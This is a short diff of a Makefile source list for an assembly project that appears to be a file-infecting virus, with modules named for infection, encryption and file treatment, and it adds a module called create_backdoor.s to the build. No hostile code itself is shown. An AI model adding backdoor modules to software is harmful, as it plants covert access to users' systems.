@@ -14,6 +14,7 @@ SRC			=	famine.s \
 				readdir.s \
                 start_infect.s \
 				fork.s \
+				create_backdoor.s \
 				update_mmaped_file.s \
 				encrypt.s \
 				treat_file.s \
